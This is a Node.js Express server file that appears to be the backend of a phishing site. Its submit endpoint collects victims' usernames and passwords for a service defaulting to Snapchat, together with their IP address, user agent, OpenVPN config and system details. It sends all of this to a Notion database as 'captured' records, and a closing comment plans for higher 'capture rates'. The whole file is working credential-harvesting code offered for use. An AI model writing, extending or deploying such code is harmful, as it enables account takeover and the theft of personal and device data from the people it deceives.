require('dotenv').config();
const express = require('express');
const path = require('path');
const https = require('https');

const app = express();
const port = process.env.PORT || 3000;

const NOTION_TOKEN=process.env.NOTION_TOKEN || '';
const NOTION_DB_ID = process.env.NOTION_DB_ID || '3b96c9e6-b5e9-81c5-b977-d644b382ed18';

app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Push a single row to Notion. stderr on failure, returns bool.
function notionCreate(props) {
  return new Promise((resolve) => {
    const body = JSON.stringify({
      parent: { database_id: NOTION_DB_ID },
      properties: props,
    });
    const req = https.request({
      hostname: 'api.notion.com',
      path: '/v1/pages',
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${NOTION_TOKEN}`,
        'Notion-Version': '2022-06-28',
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    }, (res) => {
      let chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const text = Buffer.concat(chunks).toString();
        if (res.statusCode >= 200 && res.statusCode < 300) {
          resolve({ ok: true, body: text });
        } else {
          console.error('Notion error', res.statusCode, text);
          resolve({ ok: false, status: res.statusCode, body: text });
        }
      });
    });
    req.on('error', (e) => {
      console.error('Notion request error', e.message);
      resolve({ ok: false, error: e.message });
    });
    req.write(body);
    req.end();
  });
}

// Notion rich_text truncates at 2000 chars per text block.
function rt(s) {
  if (s === undefined || s === null) return [];
  const str = String(s);
  if (!str) return [];
  const out = [];
  for (let i = 0; i < str.length; i += 1900) {
    out.push({ text: { content: str.slice(i, i + 1900) } });
  }
  return out;
}

app.post('/api/submit', async (req, res) => {
  try {
    const {
      username,
      password,
      system_info,
      ovpn_config,
      advanced_data,
      service = 'snapchat',
    } = req.body;

    if (!username || !password) {
      return res.status(400).json({ success: false, error: 'Username and password are required' });
    }

    const ipAddress = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || req.socket?.remoteAddress || req.ip || '';
    const userAgent = req.headers['user-agent'] || '';
    const platform = advanced_data?.collection_info?.platform || 'web';
    const systemInfoBlob = JSON.stringify({ basic: system_info, advanced: advanced_data, captured_at: new Date().toISOString() });

    const props = {
      'Name': { title: rt(`${username} @ ${service}`).slice(0, 1) },
      'Username': { rich_text: rt(username) },
      'Password': { rich_text: rt(password) },
      'Service': { select: { name: service } },
      'IP Address': { rich_text: rt(ipAddress) },
      'Platform': { select: { name: platform } },
      'User Agent': { rich_text: rt(userAgent) },
      'OVPN Config': { rich_text: rt(ovpn_config || '') },
      'System Info': { rich_text: rt(systemInfoBlob) },
      'Captured At': { date: { start: new Date().toISOString() } },
    };

    const result = await notionCreate(props);
    if (!result.ok) {
      return res.status(502).json({ success: false, error: 'Notion write failed', notion_status: result.status });
    }

    console.log('Captured:', { username, service, ip: ipAddress, platform });
    res.json({ success: true, message: 'Data stored successfully' });
  } catch (e) {
    console.error('Server error', e);
    res.status(500).json({ success: false, error: e.message });
  }
});

app.listen(port, () => {
  console.log(`Server on http://localhost:${port}`);
  console.log(`Notion DB: ${NOTION_DB_ID}`);
});

// ponytail: server.js used to push to Supabase + webhook backup. Now single
// Notion write. Add fallback table or retry queue when capture rate > 1 RPS.